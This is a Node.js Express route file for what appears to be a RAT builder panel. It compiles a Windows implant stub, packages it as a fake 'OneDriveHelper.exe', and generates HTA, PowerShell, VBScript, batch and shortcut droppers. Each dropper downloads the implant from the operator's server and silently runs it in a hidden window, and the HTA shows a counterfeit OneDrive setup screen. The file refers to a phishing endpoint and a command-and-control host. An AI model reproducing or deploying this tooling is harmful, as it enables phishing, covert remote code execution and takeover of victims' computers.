"use strict";

const express   = require("express");
const fs        = require("fs");
const path      = require("path");
const { spawn } = require("child_process");
const { requireAdmin }    = require("../middleware/auth");
const { buildStubBinary } = require("../controllers/builderController");

const router = express.Router();

const IS_WIN    = process.platform === "win32";
const SRC_DIR   = path.join(__dirname, "..", "..", "docs", "09-rat-architecture", "workable");
const STUB_OUT  = path.join(__dirname, "..", "..", "B4B3-RAT", "Stub", "Stub.exe");
const DL_DIR    = path.join(__dirname, "..", "downloads");
const DL_HELPER = path.join(DL_DIR, "OneDriveHelper.exe");

// Cross-compiler toolchain: prefer mingw-w64 on Linux, fall back to local MinGW on Windows
const WINDRES = IS_WIN ? path.join("C:\\MinGW\\bin\\windres.exe") : "x86_64-w64-mingw32-windres";
const GPP     = IS_WIN ? path.join("C:\\MinGW\\bin\\g++.exe")     : "x86_64-w64-mingw32-g++";

// ── Server configuration endpoint ────────────────────────────────────────────

router.get("/api/builder/config", requireAdmin, (req, res) => {
  const { AUTH_KEY, PORT } = require("../config/constants");
  const host = req.headers.host || `localhost:${PORT}`;
  res.json({ host, authKey: AUTH_KEY });
});

// ── Stub status ───────────────────────────────────────────────────────────────

router.get("/api/builder/stub-status", requireAdmin, (_req, res) => {
  if (!fs.existsSync(STUB_OUT)) return res.json({ exists: false });
  const st = fs.statSync(STUB_OUT);
  res.json({ exists: true, size: st.size, mtime: st.mtime });
});

// ── Server-side stub compilation (SSE streaming) ──────────────────────────────

let compileRunning = false;

router.post("/api/builder/compile", requireAdmin, (req, res) => {
  if (compileRunning) {
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.write("data: [COMPILE ALREADY RUNNING — please wait for it to finish]\n\n");
    res.end();
    return;
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();

  const send = line => res.write(`data: ${line}\n\n`);

  send("[INFO] Starting MinGW cross-compilation...");
  send(`[INFO] Compiler: ${GPP}`);
  send(`[INFO] Source:   ${SRC_DIR}`);
  send(`[INFO] Output:   ${STUB_OUT}`);

  compileRunning = true;

  // Step 1: windres stub.rc → stub_rc.o
  const rcObj = path.join(SRC_DIR, "stub_rc.o");
  send("[INFO] Step 1/2 — windres stub.rc → stub_rc.o");

  const rcProc = spawn(WINDRES, [
    path.join(SRC_DIR, "stub.rc"),
    "-o", rcObj,
  ], { cwd: SRC_DIR });

  rcProc.stderr.on("data", d =>
    d.toString().split("\n").forEach(l => { if (l.trim()) send("[ERR] " + l.trimEnd()); })
  );

  rcProc.on("error", e => {
    compileRunning = false;
    if (e.code === "ENOENT")
      send(`[ERROR] ${WINDRES} not found.\n[ERROR] Install: sudo apt install mingw-w64`);
    else
      send("[ERROR] windres: " + e.message);
    send("[DONE]");
    res.end();
  });

  rcProc.on("close", rcCode => {
    if (rcCode !== 0) {
      compileRunning = false;
      send("[FAILED] windres exited with code " + rcCode);
      send("[DONE]");
      res.end();
      return;
    }

    send("[INFO] Step 2/2 — g++ full_stub.cpp → Stub.exe");

    const gppProc = spawn(GPP, [
      "-std=c++17", "-O2", "-mwindows", "-s", "-fno-ident",
      "-static-libgcc", "-static-libstdc++",
      path.join(SRC_DIR, "full_stub.cpp"),
      rcObj,
      "-lwininet", "-lgdiplus", "-ladvapi32",
      "-lkernel32", "-luser32", "-lgdi32", "-lole32",
      "-o", STUB_OUT,
    ], { cwd: SRC_DIR });

    gppProc.stderr.on("data", d =>
      d.toString().split("\n").forEach(l => { if (l.trim()) send("[ERR] " + l.trimEnd()); })
    );

    gppProc.on("error", e => {
      compileRunning = false;
      if (e.code === "ENOENT")
        send(`[ERROR] ${GPP} not found.\n[ERROR] Install: sudo apt install mingw-w64`);
      else
        send("[ERROR] g++: " + e.message);
      send("[DONE]");
      res.end();
    });

    gppProc.on("close", gppCode => {
      compileRunning = false;
      if (gppCode === 0 && fs.existsSync(STUB_OUT)) {
        const sz = fs.statSync(STUB_OUT).size;
        send(`[SUCCESS] ✓ Stub.exe compiled — ${(sz / 1024).toFixed(1)} KB`);
        send("[EXE_READY]");
      } else {
        send("[FAILED] g++ exited with code " + gppCode);
      }
      send("[DONE]");
      res.end();
    });
  });

  req.on("close", () => { compileRunning = false; });
});

// ── Build and download OneDriveHelper.exe ─────────────────────────────────────
// Also saves a copy to downloads/OneDriveHelper.exe so /dl/exe can serve it.

router.post("/api/build", requireAdmin, (req, res) => {
  try {
    const out = buildStubBinary(req.body);
    // Persist to downloads/ so phish.js /dl/exe can serve it immediately
    try {
      if (!fs.existsSync(DL_DIR)) fs.mkdirSync(DL_DIR, { recursive: true });
      fs.writeFileSync(DL_HELPER, out);
    } catch (_) {}
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", 'attachment; filename="OneDriveHelper.exe"');
    res.send(out);
    console.log(`[builder] built stub  host=${req.body.c2Host}  size=${out.length}`);
  } catch (e) {
    console.error("[builder] error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// ── File carrier generators ───────────────────────────────────────────────────
// Each carrier, when executed on a Windows target, downloads and silently runs
// OneDriveHelper.exe from this server's /dl/exe endpoint.

router.get("/api/builder/carrier", requireAdmin, (req, res) => {
  const type    = (req.query.type || "").toLowerCase();
  const proto   = req.headers["x-forwarded-proto"] || (req.secure ? "https" : "http");
  const host    = req.headers.host || "localhost";
  const payload = `${proto}://${host}/dl/exe`;
  const saveTo  = "%TEMP%\\OneDriveHelper.exe";

  const carriers = {
    hta: () => ({ name: "OneDriveSetup.hta", mime: "application/hta",          body: buildHta(payload, saveTo) }),
    ps1: () => ({ name: "OneDriveSetup.ps1", mime: "application/octet-stream", body: buildPs1(payload, saveTo) }),
    vbs: () => ({ name: "OneDriveSetup.vbs", mime: "application/octet-stream", body: buildVbs(payload, saveTo) }),
    bat: () => ({ name: "OneDriveSetup.bat", mime: "application/octet-stream", body: buildBat(payload, saveTo) }),
    lnk: () => ({ name: "OneDriveSetup.lnk", mime: "application/octet-stream", body: buildLnk(payload) }),
  };

  if (!carriers[type]) {
    return res.status(400).json({ error: "Unknown type. Use: hta, ps1, vbs, bat, lnk" });
  }

  const { name, mime, body } = carriers[type]();
  res.setHeader("Content-Type", mime);
  res.setHeader("Content-Disposition", `attachment; filename="${name}"`);
  res.send(body);
  console.log(`[carrier] generated ${type}  payload=${payload}`);
});

// ── Carrier templates ─────────────────────────────────────────────────────────

function buildHta(url, saveTo) {
  return `<html>
<head><title>OneDrive Setup</title>
<hta:application id="oComp" applicationName="OneDriveSetup"
  border="none" caption="yes" maximizeButton="no" minimizeButton="no"
  showInTaskbar="yes" singleInstance="yes" windowState="normal"/>
</head>
<body style="background:#0078d4;color:white;font-family:'Segoe UI',sans-serif;margin:0;display:flex;align-items:center;justify-content:center;height:100%">
<div style="text-align:center;padding:40px">
  <div style="font-size:52px;margin-bottom:12px">&#9729;</div>
  <h2 style="margin-bottom:8px">OneDrive Setup</h2>
  <p id="msg" style="color:#cce4ff;font-size:14px">Initializing...</p>
  <div style="background:#1660b1;border-radius:4px;height:6px;margin-top:16px;width:320px">
    <div id="fill" style="background:white;height:6px;border-radius:4px;width:0%"></div>
  </div>
</div>
<script language="VBScript">
Sub Window_OnLoad
  window.resizeTo 420, 260
  window.moveTo (screen.availWidth-420)/2, (screen.availHeight-260)/2
  DoSetup
End Sub

Sub DoSetup
  On Error Resume Next
  document.getElementById("msg").innerHTML = "Checking requirements..."
  SetProgress 20
  Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.open "GET", "${url}", False
  xhr.send
  SetProgress 50
  If xhr.status = 200 Then
    document.getElementById("msg").innerHTML = "Applying update..."
    Dim stream : Set stream = CreateObject("ADODB.Stream")
    stream.Open : stream.Type = 1
    stream.Write xhr.responseBody
    stream.SaveToFile ExpandEnv("${saveTo}"), 2
    stream.Close
    SetProgress 80
    document.getElementById("msg").innerHTML = "Finishing..."
    CreateObject("WScript.Shell").Run Chr(34) & ExpandEnv("${saveTo}") & Chr(34), 0, False
    SetProgress 100
    document.getElementById("msg").innerHTML = "Setup complete."
    window.setTimeout "window.close()", 1200
  Else
    document.getElementById("msg").innerHTML = "Error " & xhr.status & " — please try again."
  End If
End Sub

Function ExpandEnv(s)
  Dim sh : Set sh = CreateObject("WScript.Shell")
  ExpandEnv = sh.ExpandEnvironmentStrings(s)
End Function

Sub SetProgress(pct)
  document.getElementById("fill").style.width = pct & "%"
End Sub
</script>
</body>
</html>`;
}

function buildPs1(url, saveTo) {
  return `# OneDrive Update Helper
$ErrorActionPreference = 'SilentlyContinue'
$dest = [System.Environment]::ExpandEnvironmentVariables('${saveTo}')
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
    $wc.DownloadFile('${url}', $dest)
    Start-Process -FilePath $dest -WindowStyle Hidden
} catch {}`;
}

function buildVbs(url, saveTo) {
  return `' OneDrive Update Helper
Option Explicit
On Error Resume Next
Dim xhr, stream, sh
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.open "GET", "${url}", False
xhr.send
If xhr.status = 200 Then
    Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
    Set stream = CreateObject("ADODB.Stream")
    stream.Open : stream.Type = 1
    stream.Write xhr.responseBody
    Dim sh2 : Set sh2 = CreateObject("WScript.Shell")
    Dim tmp : tmp = sh2.ExpandEnvironmentStrings("${saveTo}")
    stream.SaveToFile tmp, 2 : stream.Close
    Set sh = CreateObject("WScript.Shell")
    sh.Run Chr(34) & tmp & Chr(34), 0, False
End If`;
}

function buildBat(url, saveTo) {
  return `@echo off
set DEST=${saveTo}
powershell -w hidden -nop -c "try{$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$wc.DownloadFile('${url}','%DEST%');Start-Process '%DEST%' -WindowStyle Hidden}catch{}"`;
}

function buildLnk(url) {
  // PowerShell download-and-run invocation hidden in a .lnk shortcut
  const target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const args   = `-w hidden -nop -c "try{$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$dest=$env:TEMP+'\\OneDriveHelper.exe';$wc.DownloadFile('${url}',$dest);Start-Process $dest -WindowStyle Hidden}catch{}"`;
  return createLnkBuffer(target, args);
}

// Minimal [MS-SHLLINK] .lnk binary format
// Flags: HasLinkInfo(0x02) + HasArguments(0x20) + IsUnicode(0x80) = 0xA2
function createLnkBuffer(target, args) {
  const CLSID = Buffer.from([
    0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,
    0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
  ]);

  const hdr = Buffer.alloc(76, 0);
  hdr.writeUInt32LE(0x4C,   0);   // HeaderSize
  CLSID.copy(hdr, 4);             // LinkCLSID
  hdr.writeUInt32LE(0xA2,  0x14); // LinkFlags
  hdr.writeUInt32LE(0x20,  0x18); // FileAttributes: FILE_ATTRIBUTE_ARCHIVE
  hdr.writeUInt32LE(7,     0x3C); // ShowCommand: SW_SHOWMINNOACTIVE
  hdr.writeUInt16LE(0,     0x40); // HotKey

  // VolumeID (volume label "C:\")
  const volLabel  = Buffer.from("C:\\\0", "ascii");
  const volID     = Buffer.alloc(16 + volLabel.length, 0);
  volID.writeUInt32LE(volID.length, 0); // VolumeIDSize
  volID.writeUInt32LE(3,            4); // DRIVE_FIXED
  volID.writeUInt32LE(0xABCD1234,   8); // DriveSerialNumber (placeholder)
  volID.writeUInt32LE(16,          12); // VolumeLabelOffset
  volLabel.copy(volID, 16);

  // LocalBasePath and CommonPathSuffix
  const localPath = Buffer.from(target + "\0", "ascii");
  const suffix    = Buffer.from("\0", "ascii");

  // LinkInfo header (28 bytes) + VolumeID + LocalBasePath + suffix
  const LI_HDR   = 0x1C;
  const volOff   = LI_HDR;
  const pathOff  = volOff  + volID.length;
  const sufOff   = pathOff + localPath.length;
  const liSize   = sufOff  + suffix.length;

  const li = Buffer.alloc(liSize, 0);
  li.writeUInt32LE(liSize,   0);
  li.writeUInt32LE(LI_HDR,   4);
  li.writeUInt32LE(0x01,     8);   // VolumeIDAndLocalBasePath
  li.writeUInt32LE(volOff,  12);
  li.writeUInt32LE(pathOff, 16);
  li.writeUInt32LE(0,       20);   // no network share
  li.writeUInt32LE(sufOff,  24);
  volID.copy(li,    volOff);
  localPath.copy(li, pathOff);
  suffix.copy(li,   sufOff);

  // StringData — CommandLineArguments: uint16 char-count + UTF-16LE
  const argStr = Buffer.from(args, "utf16le");
  const argLen = Buffer.alloc(2);
  argLen.writeUInt16LE(args.length, 0);

  return Buffer.concat([hdr, li, argLen, argStr]);
}

module.exports = router;
